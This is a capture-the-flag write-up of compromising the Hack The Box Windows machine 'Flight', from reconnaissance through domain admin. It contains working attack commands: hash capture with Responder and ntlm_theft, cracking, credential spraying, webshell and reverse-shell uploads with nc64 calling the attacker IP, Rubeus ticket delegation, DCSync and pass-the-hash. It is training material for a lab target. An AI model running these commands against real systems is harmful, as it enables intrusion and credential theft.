---
icon: windows
---

# Flight - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.187 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 07:26 EDT
Nmap scan report for flight.htb (10.10.11.187)
Host is up (0.038s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: g0 Aviation
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-12 18:28:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-time: 
|   date: 2025-10-12T18:28:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   46.05 ms 10.10.16.1
2   46.08 ms flight.htb (10.10.11.187)
```

Nmap identified the domain name `flight.htb` I will add it to `/etc/hosts`

```
10.10.11.187	flight.htb
```

### <mark style="color:$primary;">DNS Enumeration</mark>

I'll try and brute force subdomains using dnsenum to see if anything else shows up.

{% code overflow="wrap" %}
```bash
dnsenum --dnsserver 10.10.11.187 -f ~/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt flight.htb
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2639).png" alt=""><figcaption></figcaption></figure>

dnsenum found the hostname let's add it to our `/etc/hosts` file

```
10.10.11.187	flight.htb g0.flight.htb
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2641).png" alt=""><figcaption></figcaption></figure>

None of the links lead anywhere, I'll try subdomain enumeration

#### <mark style="color:$primary;">Subdomain Enumeration</mark>

{% code overflow="wrap" %}
```bash
wfuzz -c -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u 'http://flight.htb' -H 'HOST: FUZZ.flight.htb' --hw 530
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2642).png" alt=""><figcaption></figcaption></figure>

Let's add the new found subdomain to our `/etc/host` file and see what we find

```
10.10.11.187	flight.htb g0.flight.htb school.flight.htb
```

<figure><img src="../../.gitbook/assets/image (2643).png" alt=""><figcaption></figcaption></figure>

The site is all placeholder text and a few page links, but nothing interesting

The main page is index.php. In fact, the other pages that have URLs of the form <mark style="color:$info;">**http://school.flight.htb/index.php?view=about.html**</mark>

<figure><img src="../../.gitbook/assets/image (2644).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Path Traversal Vulnerability</mark>

<figure><img src="../../.gitbook/assets/image (2645).png" alt=""><figcaption></figcaption></figure>

It returns an interesting message! Let's dig deeper

view=\ results in the same blocked response. view= returns nothing, but anything with .. in it also results in the blocked message

Switching `/` instead of `\`, make sure to use an absolute path, and it works

<figure><img src="../../.gitbook/assets/image (2646).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">RFI Grab NTLMv2 hash</mark>

I'll try a remote read over HTTP, and see if the site is using `include` or `file_get_contents`

I'll create a dummy PHP file and host it using a python http server&#x20;

{% code title="test.php" %}
```php
<?php echo 'deimos was here'; ?>
```
{% endcode %}

```bash
python3 -m http.server 80
```

<figure><img src="../../.gitbook/assets/image (2647).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2648).png" alt=""><figcaption></figcaption></figure>

The file not processed as php. The source must be using file\_get\_contents to load the contents, not include

Another way to include a file is over SMB. It won’t get anything that HTTP couldn’t get as far as execution, but the user will try to authenticate, and I could capture a <mark style="color:$primary;">**NetNTLMv2 challenge/response**</mark>&#x20;

Start responder with `sudo responder -I tun0 -A -v`, and then visit [`http://school.flight.htb/index.php?view=//10.10.14.6/share/test.php`](http://school.flight.htb/index.php?view=//10.10.16.7/share/test.php)

<figure><img src="../../.gitbook/assets/image (2649).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Cracking NetNTMLv2</mark>

```bash
john svc_apache_ntlmv2.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2650).png" alt=""><figcaption></figcaption></figure>

```
svc_apache:S@Ss!K@*t13
```

### <mark style="color:$primary;">SMB Enumeration as svc\_apache</mark>

```bash
netexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
```

<figure><img src="../../.gitbook/assets/image (2651).png" alt=""><figcaption></figcaption></figure>

I took a look at `NETLOGON` and `SYSVOL`, but nothing interesting came up

The `Shared` Folder is also empty

```bash
smbclient //flight.htb/web -U svc_apache 'S@Ss!K@*t13'
```

<figure><img src="../../.gitbook/assets/image (2652).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2653).png" alt=""><figcaption></figcaption></figure>

This looks like the machine's C:\Users share. Nothing interesting here

```bash
smbclient //flight.htb/web -U svc_apache 'S@Ss!K@*t13'
```

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

The Web share has folders for the two websites. Both are basically static websites, with no database or creds.

I'll grab the users via RID Cycling and try Credential Spraying

### <mark style="color:$primary;">RID Cycling</mark>

{% code overflow="wrap" %}
```bash
netexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Credential Spraying</mark>

{% code overflow="wrap" %}
```bash
netexec smb flight.htb -u users -p 'S@Ss!K@*t13' --continue-on-success
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

S.Moon uses the same password! Let's see what access we have with him

### <mark style="color:$primary;">SMB Enumeration as S.Moon</mark>

```bash
netexec smb flight.htb -u S.Moon -p 'S@Ss!K@*t13' --shares
```

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

S.Moon has write permissions on the Shared folder. Someone might be checking this share. Let's place some malicious files file here and force ntlm authentication. I'll use [**ntlm\_theft**](https://github.com/Greenwolf/ntlm_theft)

### <mark style="color:$primary;">Capturing Credentials with malicious files</mark>

{% code overflow="wrap" %}
```bash
python ~/tools/ntlm_theft/ntlm_theft.py -g all -s 10.10.16.7 --filename flight
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

Now to place the files on the share. Make sure you have responder ready before!

```bash
sudo responder -I tun0 -v -A
```

```bash
smbclient \\\\flight.htb\\shared -U S.Moon 'S@Ss!K@*t13'
```

<figure><img src="../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

A bunch of them got blocked, but some do make it

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

c.bum access one of our files! Let's crack his hash

### <mark style="color:$primary;">Cracking NetNTMLv2</mark>

```bash
john c.bum_ntlmv2.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

```
c.bum:Tikkycoll_431012284
```

### <mark style="color:$primary;">SMB Enumeration as c.bum</mark>

```bash
netexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
```

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

c.bum has write access on the web share! We can place a reverse shell there! I'll use [https://www.revshells.com/](https://www.revshells.com/) to create one and save it as rev.php

### <mark style="color:$primary;">Upload reverse php</mark>

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

```bash
smbclient \\\\flight.htb\\Web -U 'c.bum%Tikkycoll_431012284'
```

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Enumeration as svc\_apache</mark>

<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

There is a xampp and an inetpub directory? The xampp application is visible from the outsider, but the development website discovered in inetpub does not seem to be

```powershell
netstat -ano | findstr LISTENING
```

<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

Running netstat we discover a port 8000 that is not visible from the outsider

<figure><img src="../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

Running icacls on the directory we discover c.bum has write access to it. We can follow the same procedure as earlier and place a reverse aspx shell in the directory.

First let's get a shell as c.bum

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

c.bum is not in the remote users group so I cannot remote in as him. I am going to make use of [**RunasCs**](https://github.com/antonioCoco/RunasCs) to get a shell as c.bum then

### <mark style="color:$primary;">Shell as c.bum</mark>

```powershell
iwr -uri http://10.10.16.7/RunasCs.exe -outfile RunasCs.exe
```

Make sure you have a listener ready on port 443 before running the below command

```powershell
./RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.16.7:443 cmd
```

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Port forwarding 8000</mark>

I am going to use chisel for port forwarding and check out port 8000

```bash
./chisel_1.10.1_linux_amd64 server -p 445 --reverse
```

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

now to download chisel on the target machine and have it forward port 8000

{% code overflow="wrap" %}
```powershell
iwr -uri http://10.10.16.7/chisel_1.10.1_windows_amd64 -outfile chisel_1.10.1_windows_amd64.exe
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
\chisel_1.10.1_windows_amd64.exe client 10.10.16.7:445 R:8001:127.0.0.1:8000
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumerating Port 8000</mark>

<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

The response headers show that the site is hosted by IIS. They also show `X-Powered-By: ASP.NET`. Typically that means that `.aspx` type pages are in use

### <mark style="color:$primary;">Abusing Write ACL on inetpub</mark>

Remember that C.Bum should has write access to this directory \[inetpub]. Let's test it out with a dummy file

```powershell
echo "test" > test.txt
```

<figure><img src="../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

To see if ASPX code will run, I’ll create ASPX file that writes a string, `poc.aspx`

```powershell
echo '<% Response.Write("deimos was here") %>' > poc.aspx
```

<figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

I’ll download [**this aspx webshell**](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) from GitHub and upload it&#x20;

```bash
wget 10.10.16.7/cmd.aspx -outfile cmd.aspx
```

<figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

I'll upload nc64.exe onto the machine and get a reverse shell as the user running this site

<figure><img src="../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

```powershell
/C \inetpub\development\nc64.exe 10.10.16.7 443 -e cmd
```

<figure><img src="../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumeration as iis apppool</mark>

`iis apppool\defaultapppool` is a Microsoft Virtual Account. One thing about these accounts is that when they authenticate over the network, they do so as the machine account. For example, if I start `responder` and then try to open an SMB share on it `net use \10.10.16.7\doesntmatter`, the account I see trying to authenticate is `flight\G0$`

<figure><img src="../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

Machine accounts use long random passwords no point in trying to crack the NetNTLMv2. But it does show that the defaultapppool account is authenticating as the machine account.

To abuse this, I’ll just ask the machine for a ticket for the machine account over the network

### <mark style="color:$primary;">Abusing Microsoft Account Getting Ticket -> DCSync Attack</mark>

First I'll upload rubeus.exe

<figure><img src="../../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

#### Generating a ticket

To create a ticket, I’ll use the `tgtdeleg` command

```powershell
.\rubeus.exe tgtdeleg /nowrap
```

<figure><img src="../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Configure Kerberos Ticket</mark>

With a ticket for the machine account, I can do a DCSync attack, effectively telling the DC that I’d like to replicate all the information in it to myself. To do that, I’ll need to configure Kerberos on my VM to use the ticket I just dumped

I’ll decode the base64 ticket and save it as `ticket.kirbi`. Then `kirbi2ccache` will convert it to the format needed by my Linux system

{% code overflow="wrap" %}
```bash
echo "doIFVDCCBVC..." | base64 -d > ticket.kirbi
```
{% endcode %}

```bash
minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
```

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

Now I’ll export the environment variable to hold that ticket

```bash
export KRB5CCNAME=ticket.ccache
```

### <mark style="color:$primary;">DCSync Attack</mark>

First I will sync my \[kali]machines clock to the target machines DC

```bash
service virtualbox-guest-utils stop
```

```bash
sudo ntpdate flight.htb
```

{% code overflow="wrap" %}
```bash
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

We got the admin's hash, now to get a shell as the administrator user

{% code overflow="wrap" %}
```bash
rlwrap impacket-psexec administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>
